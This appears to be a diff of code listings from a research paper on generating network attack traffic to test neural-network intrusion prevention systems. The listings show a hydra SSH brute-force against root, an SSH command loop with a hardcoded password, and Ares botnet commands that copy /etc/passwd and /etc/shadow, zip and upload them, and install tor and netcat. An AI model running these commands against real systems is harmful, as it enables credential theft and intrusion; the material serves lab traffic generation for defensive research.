Automated Network Packet Generation for Evaluation of Neural Networks in Intrusion Prevention Systems

### 2020-07-12 paper1/paper1.tex

ENTRYPOINT while true; do sshpass -p "technikum" \ 
			ssh -o StrictHostKeyChecking=no \
			"technikum@${targetip}" ${command}; \
			sleep 5; done
\end{lstlisting}

@@

ENTRYPOINT ["hydra", "-l", "root", \
            "-P", "/usr/share/wordlists/rockyou.txt", \
            "192.168.0.10", "-t", "4", "ssh"]
\end{lstlisting}

@@

\begin{lstlisting}[basicstyle=\footnotesize]
apt -y install tor
download http://ipv4.download.thinkbroadband.com/5MB.zip
screenshot
mkdir -p /tmp/zzz
cp /etc/passwd /tmp/zzz/
cp /etc/shadow /tmp/zzz/
zip zzz.zip /tmp/zzz/
upload zzz.zip
rm -rf /tmp/zzz zzz.zip 5MB.zip
apt -y remove tor
download http://ipv4.download.thinkbroadband.com/100MB.zip
apt -y install curl wget netcat

@@

RUN git clone https://github.com/sweetsoftware/Ares.git && \
    cd Ares && \
    pip install -r requirements.txt

>>>>

ENTRYPOINT  while true; \
            do sshpass -p "technikum" \
            ssh -o StrictHostKeyChecking=no \ 
            "technikum@${targetip}" ${command}; \
            sleep 5; done
\end{lstlisting}

@@

ENTRYPOINT ["hydra", "-l", "root", \
            "-P", \
            "/usr/share/wordlists/rockyou.txt", \
            "192.168.0.10", "-t", "4", "ssh"]
\end{lstlisting}

@@

\begin{lstlisting}[basicstyle=\footnotesize]
apt -y install tor
download \
  http://ipv4.download.thinkbroadband.com/5MB.zip
screenshot
mkdir -p /tmp/zzz
cp /etc/passwd /tmp/zzz/
cp /etc/shadow /tmp/zzz/
zip zzz.zip /tmp/zzz/
upload zzz.zip
rm -rf /tmp/zzz zzz.zip 5MB.zip
apt -y remove tor
download \
  http://ipv4.download.thinkbroadband.com/100MB.zip
apt -y install curl wget netcat

@@

RUN git clone \ 
    https://github.com/sweetsoftware/Ares.git && \
    cd Ares && \
    pip install -r requirements.txt
